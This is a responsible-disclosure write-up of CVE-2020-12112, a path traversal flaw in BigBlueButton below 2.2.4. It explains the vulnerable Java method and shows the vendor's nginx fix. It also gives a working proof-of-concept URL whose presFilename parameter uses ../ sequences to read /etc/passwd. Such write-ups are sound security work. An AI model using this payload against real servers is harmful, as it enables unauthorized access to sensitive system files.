# CVE-2020-12112 🚨
BigBlueButton versions lower than 2.2.4 have a LFI vulnerability allowing access to sensitive files.

## Story 📜

During a distance learning course on a BigBlueButton instance a student in my class shared my teacher's slide presentation link and I noticed that the file name was included in the URL.

![School's Slack](/screen1.png "School's Slack")

```
Student: "No need to write notes, I've got the slide."
Me: Well, I've got a security report to make. 😂
```

By playing a little bit with it I was able to get access to the `/etc/passwd` file of the server and discover the existence of a security vulnerability on the open-source Big Blue Button solution.

I reported the vulnerability, the BBB team was quick to answer me and patch the vulnerability (only a few days).

## Poc 🧙

    public File getDownloadablePresentationFile(String meetingId, String presId, String presFilename) {
    	log.info("Find downloadable presentation for meetingId={} presId={} filename={}", meetingId, presId, presFilename);

        File presDir = Util.getPresentationDir(presentationBaseDir, meetingId, presId);
        return new File(presDir.getAbsolutePath() + File.separatorChar + presFilename);
    }
https://github.com/bigbluebutton/bigbluebutton/blob/v2.2.3/bbb-common-web/src/main/java/org/bigbluebutton/api/RecordingService.java#L90

As you can see this method used by a `PresentationController` allows you to download a presentation file by concatenating 3 parameters.

- Absolute path of the file
- A separator character
- File name

This makes it possible to obtain links like this:

`https://test.bigbluebutton.org/bigbluebutton/presentation/download/ffc98830dbfbac3dcc80cc4c5f30711ebd1c23e8-1586764259489/d2d9a672040fbde2a47a10bf6c37b6a4b5ae187f-1586764259500?presFilename=d2d9a672040fbde2a47a10bf6c37b6a4b5ae187f-1586764259500.pdf`

To exploit the vulnerability, just get a valid link to a presentation file and modify the *presFilename* parameter to access sensitive files.

`https://test.bigbluebutton.org/bigbluebutton/presentation/download/ffc98830dbfbac3dcc80cc4c5f30711ebd1c23e8-1586764259489/d2d9a672040fbde2a47a10bf6c37b6a4b5ae187f-1586764259500?presFilename=../../../../../etc/passwd`

![/etc/passwd file](/screen2.png "/etc/passwd file")

## Patch 🤕

The BBB team patched the vulnerability in the 2.2.4 version via a server configuration rule (HTTP), a regex and a precise filename format.

```
		location /bigbluebutton/presentation/download {
			return 404;
		}

		location ~ "^/bigbluebutton/presentation/download\/[0-9a-f]+-[0-9]+/[0-9a-f]+-[0-9]+$" {
			if ($arg_presFilename !~ "^[0-9a-f]+-[0-9]+\.[0-9a-zA-Z]+$") {
				return 404;
			}
			proxy_pass         http://127.0.0.1:8090$uri$is_args$args;
			proxy_set_header   X-Forwarded-For   $proxy_add_x_forwarded_for;
			# Workaround IE refusal to set cookies in iframe
			add_header P3P 'CP="No P3P policy available"';
		}
```

https://github.com/bigbluebutton/bigbluebutton/commit/5ebdf5ca7718fc8bb3c08867edd150278e6a724c#diff-c7d77969a4547b5349e55c5466948a27R45

## References 🔍

- https://github.com/bigbluebutton/bigbluebutton/blob/master/bigbluebutton-web/grails-app/controllers/org/bigbluebutton/web/controllers/PresentationController.groovy
- https://github.com/bigbluebutton/bigbluebutton/commit/5ebdf5ca7718fc8bb3c08867edd150278e6a724c
- https://twitter.com/thibeault_chenu/status/1249976515917422593
- https://twitter.com/bigbluebutton/status/1252706369486180353

